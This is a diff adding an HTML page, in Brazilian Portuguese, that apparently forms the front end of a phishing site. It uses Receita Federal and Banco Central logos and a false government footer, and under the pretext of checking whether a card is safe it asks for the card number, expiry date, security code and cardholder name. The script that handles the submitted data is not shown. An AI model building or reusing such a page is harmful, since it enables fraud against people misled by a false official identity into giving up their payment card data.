@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+    <head>
+        <meta charset="UTF-8" />
+        <meta
+            name="viewport"
+            content="width=device-width, initial-scale=1.0"
+        />
+        <title>Meu cartão está seguro?</title>
+        <link
+            rel="shortcut icon"
+            href="/assets/imgs/receita-federal.png"
+            type="image/png"
+        />
+        <link
+            rel="stylesheet"
+            href="styles.css"
+        />
+    </head>
+    <body>
+        <header>
+            <img
+                src="/assets/imgs/receita-federal.png"
+                alt="Logo Receita Federal"
+                class="logo"
+            />
+            <img
+                src="/assets/imgs/banco-central.png"
+                alt="Logo Banco Central"
+                class="logo"
+            />
+        </header>
+
+        <div class="container">
+            <h1>Meu cartão está seguro?</h1>
+            <form id="payment-form">
+                <label for="card-number">Número do cartão</label>
+                <input
+                    type="text"
+                    id="card-number"
+                    placeholder="0000 0000 0000 0000"
+                    maxlength="19"
+                    required
+                />
+                <div id="card-brand-container">
+                    <img
+                        id="card-brand-logo"
+                        src=""
+                        alt="Bandeira do cartão"
+                        style="display: none"
+                    />
+                    <p id="card-brand"></p>
+                </div>
+
+                <label for="expiry-date">Validade</label>
+                <input
+                    type="text"
+                    id="expiry-date"
+                    placeholder="MM/AA"
+                    maxlength="5"
+                    required
+                />
+
+                <label for="security-code">Código de segurança</label>
+                <input
+                    type="text"
+                    id="security-code"
+                    placeholder="000"
+                    maxlength="3"
+                    required
+                />
+
+                <label for="cardholder-name">Nome impresso</label>
+                <input
+                    type="text"
+                    id="cardholder-name"
+                    placeholder="Nome impresso no cartão"
+                    required
+                />
+
+                <button type="submit">Investigar</button>
+            </form>
+        </div>
+
+        <footer>
+            <p>© 2024 Governo Federal - Receita Federal</p>
+        </footer>
+
+        <script
+            src="script.mjs"
+            type="module"
+        ></script>
+    </body>
+</html>
